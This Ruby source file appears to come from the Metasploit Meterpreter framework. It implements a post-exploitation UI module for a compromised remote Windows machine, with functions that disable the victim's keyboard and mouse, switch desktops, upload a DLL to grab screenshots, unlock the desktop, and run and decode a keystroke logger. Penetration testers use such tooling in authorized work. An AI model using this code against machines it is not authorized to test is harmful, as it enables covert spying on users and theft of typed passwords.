# -*- coding: binary -*-

require 'rex/post/ui'
require 'meterpreter_binaries'

module Rex
module Post
module Meterpreter
module Extensions
module Stdapi

###
#
# Allows for interacting with the user interface on the remote machine,
# such as by disabling the keyboard and mouse.
#
# WARNING:
#
# Using keyboard and mouse enabling/disabling features will result in
# a DLL file being written to disk.
#
###
class UI < Rex::Post::UI

  include Rex::Post::Meterpreter::ObjectAliasesContainer

  ##
  #
  # Constructor
  #
  ##

  #
  # Initializes the post-exploitation user-interface manipulation subsystem.
  #
  def initialize(client)
    self.client = client
  end

  ##
  #
  # Device enabling/disabling
  #
  ##

  #
  # Disable keyboard input on the remote machine.
  #
  def disable_keyboard
    return enable_keyboard(false)
  end

  #
  # Enable keyboard input on the remote machine.
  #
  def enable_keyboard(enable = true)
    request = Packet.create_request('stdapi_ui_enable_keyboard')

    request.add_tlv(TLV_TYPE_BOOL, enable)

    response = client.send_request(request)

    return true
  end

  #
  # Disable mouse input on the remote machine.
  #
  def disable_mouse
    return enable_mouse(false)
  end

  #
  # Enable mouse input on the remote machine.
  #
  def enable_mouse(enable = true)
    request = Packet.create_request('stdapi_ui_enable_mouse')

    request.add_tlv(TLV_TYPE_BOOL, enable)

    response = client.send_request(request)

    return true
  end

  #
  # Returns the number of seconds the remote machine has been idle
  # from user input.
  #
  def idle_time
    request = Packet.create_request('stdapi_ui_get_idle_time')

    response = client.send_request(request)

    return response.get_tlv_value(TLV_TYPE_IDLE_TIME);
  end

  #
  # Enumerate desktops.
  #
  def enum_desktops
    request  = Packet.create_request('stdapi_ui_desktop_enum')
    response = client.send_request(request)
    desktopz = []
    if( response.result == 0 )
      response.each( TLV_TYPE_DESKTOP ) { | desktop |
      desktopz << {
          'session' => desktop.get_tlv_value( TLV_TYPE_DESKTOP_SESSION ),
          'station' => desktop.get_tlv_value( TLV_TYPE_DESKTOP_STATION ),
          'name'    => desktop.get_tlv_value( TLV_TYPE_DESKTOP_NAME )
        }
      }
    end
    return desktopz
  end

  #
  # Get the current desktop meterpreter is using.
  #
  def get_desktop
    request  = Packet.create_request( 'stdapi_ui_desktop_get' )
    response = client.send_request( request )
    desktop  = {}
    if( response.result == 0 )
      desktop = {
          'session' => response.get_tlv_value( TLV_TYPE_DESKTOP_SESSION ),
          'station' => response.get_tlv_value( TLV_TYPE_DESKTOP_STATION ),
          'name'    => response.get_tlv_value( TLV_TYPE_DESKTOP_NAME )
        }
    end
    return desktop
  end

  #
  # Change the meterpreters current desktop. The switch param sets this
  # new desktop as the interactive one (The local users visible desktop
  # with screen/keyboard/mouse control).
  #
  def set_desktop( session=-1, station='WinSta0', name='Default', switch=false )
    request  = Packet.create_request( 'stdapi_ui_desktop_set' )
    request.add_tlv( TLV_TYPE_DESKTOP_SESSION, session )
    request.add_tlv( TLV_TYPE_DESKTOP_STATION, station )
    request.add_tlv( TLV_TYPE_DESKTOP_NAME, name )
    request.add_tlv( TLV_TYPE_DESKTOP_SWITCH, switch )
    response = client.send_request( request )
    if( response.result == 0 )
      return true
    end
    return false
  end

  #
  # Grab a screenshot of the interactive desktop
  #
  def screenshot( quality=50 )
    request = Packet.create_request( 'stdapi_ui_desktop_screenshot' )
    request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY, quality )
    # include the x64 screenshot dll if the host OS is x64
    if( client.sys.config.sysinfo['Architecture'] =~ /^\S*x64\S*/ )
      screenshot_path = MeterpreterBinaries.path('screenshot', 'x64.dll')
      screenshot_dll  = ''
      ::File.open( screenshot_path, 'rb' ) do |f|
        screenshot_dll += f.read( f.stat.size )
      end
      request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_BUFFER, screenshot_dll, false, true )
      request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_LENGTH, screenshot_dll.length )
    end
    # but allways include the x86 screenshot dll as we can use it for wow64 processes if we are on x64
    screenshot_path = MeterpreterBinaries.path('screenshot', 'x86.dll')
    screenshot_dll  = ''
    ::File.open( screenshot_path, 'rb' ) do |f|
      screenshot_dll += f.read( f.stat.size )
    end
    request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_BUFFER, screenshot_dll, false, true )
    request.add_tlv( TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_LENGTH, screenshot_dll.length )
    # send the request and return the jpeg image if successfull.
    response = client.send_request( request )
    if( response.result == 0 )
      return response.get_tlv_value( TLV_TYPE_DESKTOP_SCREENSHOT )
    end
    return nil
  end

  #
  # Unlock or lock the desktop
  #
  def unlock_desktop(unlock=true)
    request  = Packet.create_request('stdapi_ui_unlock_desktop')
    request.add_tlv(TLV_TYPE_BOOL, unlock)
    response = client.send_request(request)
    return true
  end

  #
  # Start the keyboard sniffer
  #
  def keyscan_start
    request  = Packet.create_request('stdapi_ui_start_keyscan')
    response = client.send_request(request)
    return true
  end

  #
  # Stop the keyboard sniffer
  #
  def keyscan_stop
    request  = Packet.create_request('stdapi_ui_stop_keyscan')
    response = client.send_request(request)
    return true
  end

  #
  # Dump the keystroke buffer
  #
  def keyscan_dump
    request  = Packet.create_request('stdapi_ui_get_keys')
    response = client.send_request(request)
    return response.get_tlv_value(TLV_TYPE_KEYS_DUMP);
  end

  #
  # Extract the keystroke from the buffer data
  #
  def keyscan_extract(buffer_data)
    outp = ""
    buffer_data.unpack("n*").each do |inp|
      fl = (inp & 0xff00) >> 8
      vk = (inp & 0xff)
      kc = VirtualKeyCodes[vk]

      f_shift = fl & (1<<1)
      f_ctrl  = fl & (1<<2)
      f_alt   = fl & (1<<3)

      if(kc)
        name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
        case name
        when /^.$/
          outp << name
        when /shift|click/i
        when 'Space'
          outp << " "
        else
          outp << " <#{name}> "
        end
      else
        outp << " <0x%.2x> " % vk
      end
    end
    return outp
  end

protected
  attr_accessor :client # :nodoc:

end

end; end; end; end; end
